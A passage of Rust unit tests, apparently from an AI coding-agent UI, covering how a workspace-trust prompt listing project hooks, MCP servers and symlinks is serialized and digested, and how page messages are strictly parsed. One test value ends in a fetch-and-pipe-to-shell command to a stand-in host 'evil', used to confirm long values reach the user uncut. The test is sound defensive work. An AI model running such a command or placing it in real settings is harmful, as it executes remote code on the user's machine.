                parse_inbound_message(&line).unwrap().tab_ref(),
                TabRef::WindowLevel
            ));
        }
        assert!(matches!(
            parse_inbound_message(TRUST_ANSWER).unwrap().tab_ref(),
            TabRef::Named(TabId(3))
        ));
        assert!(matches!(
            parse_inbound_message(TRUST_CANCEL).unwrap().tab_ref(),
            TabRef::Named(TabId(3))
        ));
    }

    fn prompt() -> TrustPromptView {
        TrustPromptView {
            tab: TabId(3),
            nonce: 17,
            agent: "Claude".into(),
            root: "/home/u/p/src".into(),
            top: "/home/u/p".into(),
            fingerprint: "f".repeat(64),
            state: TrustPromptState::Untrusted,
            needs_yes: false,
            remember: TrustRememberView::Yes,
            remember_note: None,
            changed: None,
            items: vec![
                TrustItemView {
                    what: "hook",
                    file: ".claude/settings.json".into(),
                    label: "SessionStart".into(),
                    value: "touch /tmp/m".into(),
                    outside: false,
                },
                TrustItemView {
                    what: "mcp_server",
                    file: ".mcp.json".into(),
                    label: "marker".into(),
                    value: "sh -c 'touch /tmp/n; exec sleep 60'".into(),
                    outside: false,
                },
                TrustItemView {
                    what: "symlink",
                    file: ".claude/hooks/run".into(),
                    label: ".claude/hooks/run".into(),
                    value: "/opt/x/run".into(),
                    outside: true,
                },
            ],
        }
    }

    #[test]
    fn trust_prompt_serializes_exactly() {
        let view = prompt();
        let digest = view.findings_digest();
        assert_eq!(digest.len(), 64);
        assert!(digest.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)));
        assert_eq!(
            serde_json::from_str::<Value>(&serialize_trust_prompt_for_js(&view)).unwrap(),
            json!({
                "kind": "trust_prompt",
                "tab": 3,
                "nonce": 17,
                "agent": "Claude",
                "root": "/home/u/p/src",
                "top": "/home/u/p",
                "fingerprint": "f".repeat(64),
                "findingsDigest": digest,
                "state": "untrusted",
                "needsYes": false,
                "remember": "yes",
                "rememberNote": null,
                "changed": null,
                "items": [
                    {"what": "hook", "file": ".claude/settings.json", "label": "SessionStart",
                     "value": "touch /tmp/m", "outside": false},
                    {"what": "mcp_server", "file": ".mcp.json", "label": "marker",
                     "value": "sh -c 'touch /tmp/n; exec sleep 60'", "outside": false},
                    {"what": "symlink", "file": ".claude/hooks/run", "label": ".claude/hooks/run",
                     "value": "/opt/x/run", "outside": true},
                ],
            })
        );

        // A long value is sent whole: nothing is cut, so nothing unseen can be approved.
        let mut long = prompt();
        long.items = vec![TrustItemView {
            what: "other_setting",
            file: ".claude/settings.json".into(),
            label: "x".into(),
            value: format!("{}; curl evil | sh", "é".repeat(5000)),
            outside: false,
        }];
        let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&long)).unwrap();
        assert_eq!(sent["items"][0]["value"], long.items[0].value);

        // A changed prompt, and one that cannot be remembered.
        let mut changed = prompt();
        changed.state = TrustPromptState::Changed;
        changed.remember = TrustRememberView::Session;
        changed.remember_note = Some("y trusts this start only; the next one asks again".into());
        changed.changed = Some(TrustDiffView {
            added: vec![".mcp.json".into()],
            removed: vec![],
            changed: vec![".claude/settings.json".into()],
        });
        let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&changed)).unwrap();
        assert_eq!(sent["state"], "changed");
        assert_eq!(sent["remember"], "session");
        assert_eq!(
            sent["rememberNote"],
            "y trusts this start only; the next one asks again"
        );
        assert_eq!(
            sent["changed"],
            json!({"added": [".mcp.json"], "removed": [], "changed": [".claude/settings.json"]})
        );

        let mut window = prompt();
        window.remember = TrustRememberView::Window;
        window.remember_note = Some("no state directory".into());
        let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&window)).unwrap();
        assert_eq!(sent["remember"], "window");
        assert_eq!(sent["rememberNote"], "no state directory");
    }

    #[test]
    fn the_findings_digest_follows_what_is_shown() {
        let base = prompt().findings_digest();
        assert_eq!(base, prompt().findings_digest(), "stable");

        // Not the tab or the nonce: they are not on screen.
        let mut other = prompt();
        other.tab = TabId(9);
        other.nonce = 999;
        assert_eq!(other.findings_digest(), base);

        type Change = Box<dyn Fn(&mut TrustPromptView)>;
        let changes: Vec<(&str, Change)> = vec![
            ("agent", Box::new(|v| v.agent = "Codex".into())),
            ("root", Box::new(|v| v.root.push('x'))),
            ("top", Box::new(|v| v.top.push('x'))),
            ("fingerprint", Box::new(|v| v.fingerprint = "e".repeat(64))),
            ("state", Box::new(|v| v.state = TrustPromptState::Changed)),
            ("state nothing", Box::new(|v| v.state = TrustPromptState::Nothing)),
            ("state too large", Box::new(|v| v.state = TrustPromptState::TooLarge)),
            ("needsYes", Box::new(|v| v.needs_yes = true)),
            ("remember", Box::new(|v| v.remember = TrustRememberView::Window)),
            ("note", Box::new(|v| v.remember_note = Some("why".into()))),
            (
                "changed",
                Box::new(|v| {
                    v.changed = Some(TrustDiffView {
                        added: vec!["a".into()],
                        removed: vec![],
                        changed: vec![],
                    });
                }),
            ),
            ("value", Box::new(|v| v.items[0].value.push('!'))),
            ("label", Box::new(|v| v.items[1].label.push('!'))),
            ("file", Box::new(|v| v.items[2].file.push('!'))),
            ("what", Box::new(|v| v.items[0].what = "env")),
            ("outside", Box::new(|v| v.items[0].outside = true)),
            ("an item added", Box::new(|v| v.items.push(v.items[0].clone()))),
            ("an item dropped", Box::new(|v| drop(v.items.pop()))),
            ("items swapped", Box::new(|v| v.items.swap(0, 1))),
        ];
        for (what, change) in &changes {
            let mut v = prompt();
            change(&mut v);
            assert_ne!(v.findings_digest(), base, "{what}");
        }

        // The digest is over the value as shown, and the page shows all of it: a change past any
        // length moves the digest.
        let mut long = prompt();
        long.items[0].value = format!("{}A", "x".repeat(10_000));
        let first = long.findings_digest();
        long.items[0].value = format!("{}B", "x".repeat(10_000));
        assert_ne!(
            long.findings_digest(),
            first,
            "the last character of a long value is hashed"
        );
    }
}

#[cfg(test)]
mod question_message_tests {
    //! The page's two question answers on the wire: every field named, the decline's kind a closed
    //! set, and anything else a parse failure rather than a default.
    use super::*;

    #[test]
    fn question_draft_has_a_tab_and_an_interaction_without_an_answer() {
        let message = parse_inbound_message(r#"{"type":"question_draft","request_id":"d1","tab":3,"interaction_id":"q1","draft":{"page":1,"text":"typed"}}"#).unwrap();
        assert_eq!(message.request_id(), "d1");
        assert!(matches!(message.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
        assert!(
            matches!(message, InboundMessage::QuestionDraft { interaction_id, draft, .. } if interaction_id == "q1" && draft["text"] == "typed")
        );
    }

    #[test]
    fn edit_question_other_names_the_question_and_text() {
        let message = parse_inbound_message(r#"{"type":"edit_question_other","request_id":"e1","tab":3,"interaction_id":"q1","question_index":2,"text":"typed"}"#).unwrap();
        assert_eq!(message.request_id(), "e1");
        assert!(matches!(message.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
        assert!(
            matches!(message, InboundMessage::EditQuestionOther { interaction_id, question_index: 2, text, .. } if interaction_id == "q1" && text == "typed")
        );
        assert!(parse_inbound_message(r#"{"type":"edit_question_other","request_id":"e1","interaction_id":"q1","question_index":-1,"text":"typed"}"#).is_none());
    }

    #[test]
    fn a_question_answer_parses_into_indexes_and_typed_text() {
        let message = parse_inbound_message(
            r#"{"type":"question_answer","request_id":"r1","tab":3,"interaction_id":"i1","answers":[{"question_index":0,"option_indexes":[1]},{"question_index":1,"option_indexes":[0,2],"other_text":"bench","notes":null}]}"#,
        )
        .expect("parses");
        assert_eq!(message.request_id(), "r1");
        assert!(matches!(message.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
        let InboundMessage::QuestionAnswer {
            interaction_id,
            answers,
            ..
        } = message
        else {
            panic!("a question_answer");
        };
        assert_eq!(interaction_id, "i1");
        let answers: Vec<agent::QuestionAnswer> = answers.into_iter().map(QuestionAnswerWire::into_answer).collect();
        assert_eq!(
            answers,
            vec![
                agent::QuestionAnswer {
                    question_index: 0,
                    option_indexes: vec![1],
                    other_text: None,
                    notes: None,
                },
                agent::QuestionAnswer {
                    question_index: 1,
                    option_indexes: vec![0, 2],
                    other_text: Some("bench".into()),
                    notes: None,
                },
            ]
        );
    }

    #[test]
    fn a_question_decline_parses_its_kind_and_what_was_answered() {
        let cancel = parse_inbound_message(
            r#"{"type":"question_decline","request_id":"r1","tab":3,"interaction_id":"i1","kind":"cancel"}"#,
        )
        .expect("parses");
        assert!(matches!(
            cancel,
            InboundMessage::QuestionDecline { kind: QuestionDeclineChoice::Cancel, ref so_far, .. } if so_far.is_empty()
        ));
        let chat = parse_inbound_message(
            r#"{"type":"question_decline","request_id":"r2","tab":3,"interaction_id":"i1","kind":"chat","so_far":[{"question_index":0,"option_indexes":[0]}]}"#,
        )
        .expect("parses");
        let InboundMessage::QuestionDecline { kind, so_far, .. } = chat else {
            panic!("a question_decline");
        };
        assert_eq!(kind.kind(), agent::QuestionDeclineKind::Chat);
        assert_eq!(so_far.len(), 1);
        assert_eq!(QuestionDeclineChoice::Cancel.kind(), agent::QuestionDeclineKind::Cancel);
    }

    #[test]
    fn an_editor_card_answer_parses_its_decision_and_origin() {
        let parsed = parse_inbound_message(
            r#"{"type":"editor_card_answer","request_id":"r1","tab":3,"card_id":"ec-0-1","decision":"allow","origin":"key"}"#,
        )
        .expect("parses");
        assert_eq!(parsed.request_id(), "r1");
        assert!(matches!(parsed.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
        let InboundMessage::EditorCardAnswer {
            card_id,
            decision,
            origin,
            ..
        } = parsed
        else {
            panic!("an editor_card_answer");
        };
        assert_eq!(card_id, "ec-0-1");
        assert_eq!(
            decision.card_decision(),
            crate::editor_tools::cards::CardDecision::Allow
        );
        assert_eq!(origin.origin(), crate::editor_tools::cards::CardOrigin::Key);
        assert_eq!(
            CardOriginChoice::Click.origin(),
            crate::editor_tools::cards::CardOrigin::Click
        );
        assert_eq!(
            DecisionChoice::Deny.card_decision(),
            crate::editor_tools::cards::CardDecision::Deny
        );
    }

    #[test]
    fn editor_card_view_parses() {
        let parsed =
            parse_inbound_message(r#"{"type":"editor_card_view","request_id":"r1","tab":3,"proposal":"p-2","file":1}"#)
                .expect("parses");
        assert_eq!(parsed.request_id(), "r1");
        assert!(matches!(parsed.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
        let InboundMessage::EditorCardView { proposal, file, .. } = parsed else {
            panic!("an editor_card_view");
        };
        assert_eq!((proposal.as_str(), file), ("p-2", 1));
    }

    #[test]
    fn a_missing_file_index_does_not_parse() {
        for raw in [
            r#"{"type":"editor_card_view","request_id":"r","tab":1,"proposal":"p-1"}"#,
            r#"{"type":"editor_card_view","request_id":"r","tab":1,"proposal":"p-1","file":-1}"#,
            r#"{"type":"editor_card_view","request_id":"r","tab":1,"file":0}"#,
        ] {
            assert!(parse_inbound_message(raw).is_none(), "{raw}");
        }
    }

    /// `origin` says how the person answered, so nothing but the two words the page sends may stand for one.
    #[test]
    fn an_editor_card_answer_without_a_known_origin_does_not_parse() {
        for raw in [
            r#"{"type":"editor_card_answer","request_id":"r","tab":1,"card_id":"c","decision":"allow"}"#,
            r#"{"type":"editor_card_answer","request_id":"r","tab":1,"card_id":"c","decision":"allow","origin":"agent"}"#,
            r#"{"type":"editor_card_answer","request_id":"r","tab":1,"card_id":"c","decision":"always","origin":"key"}"#,
            r#"{"type":"editor_card_answer","request_id":"r","tab":1,"decision":"allow","origin":"key"}"#,
        ] {
            assert!(parse_inbound_message(raw).is_none(), "{raw}");
        }
    }

    #[test]
    fn an_editor_card_answer_with_any_other_origin_does_not_parse() {
        let answer = |origin: &str| {
            format!(
                r#"{{"type":"editor_card_answer","request_id":"r","tab":1,"card_id":"c","decision":"allow","origin":"{origin}"}}"#
            )
        };
        for origin in ["agent", "host", "sweep", "bypass", "ctrl_y", "Key", "KEY", "click ", ""] {
            assert!(parse_inbound_message(&answer(origin)).is_none(), "{origin:?}");
        }
        for origin in ["key", "click"] {
            assert!(parse_inbound_message(&answer(origin)).is_some(), "{origin:?}");
        }
    }

    #[test]
    fn the_editor_cards_envelope_holds_the_shared_wire_shape() {
        let fixture: Value =
            serde_json::from_str(include_str!("../../agent-ui/web/src/fixtures/editor-cards.json")).unwrap();
        let cards: Vec<crate::editor_tools::cards::EditorCardWire> = serde_json::from_value(fixture.clone()).unwrap();
        let envelope: Value =
            serde_json::from_str(&serialize_editor_cards_for_js(crate::tabs::TabId(7), &cards)).unwrap();
        assert_eq!(envelope["kind"], "editor_cards");
        assert_eq!(envelope["tab"], 7);
        assert_eq!(envelope["cards"], fixture);
        let empty: Value = serde_json::from_str(&serialize_editor_cards_for_js(crate::tabs::TabId(7), &[])).unwrap();
        assert_eq!(
            empty["cards"],
            json!([]),
            "an empty list is what takes a card off the page"
        );
    }

    #[test]
    fn an_unknown_kind_or_a_malformed_answer_does_not_parse() {
        for raw in [
            r#"{"type":"question_decline","request_id":"r","tab":1,"interaction_id":"i1","kind":"later"}"#,
            r#"{"type":"question_decline","request_id":"r","tab":1,"interaction_id":"i1"}"#,
            r#"{"type":"question_answer","request_id":"r","tab":1,"interaction_id":"i1"}"#,
            r#"{"type":"question_answer","request_id":"r","tab":1,"interaction_id":"i1","answers":[{"question_index":0}]}"#,
            r#"{"type":"question_answer","request_id":"r","tab":1,"interaction_id":"i1","answers":[{"question_index":-1,"option_indexes":[]}]}"#,
            r#"{"type":"question_answer","request_id":"r","tab":1,"interaction_id":"i1","answers":[{"question_index":0,"option_indexes":["0"]}]}"#,
            r#"{"type":"question_answer","request_id":"r","tab":1,"interaction_id":"i1","answers":[{"question_index":0,"option_indexes":[0],"answer":"Grid"}]}"#,
            r#"{"type":"question_decline","request_id":"r","tab":1,"interaction_id":"i1","kind":"chat","so_far":[{"question_index":0,"option_indexes":[0],"updatedInput":{}}]}"#,
        ] {
            assert!(parse_inbound_message(raw).is_none(), "{raw}");
        }
    }
}
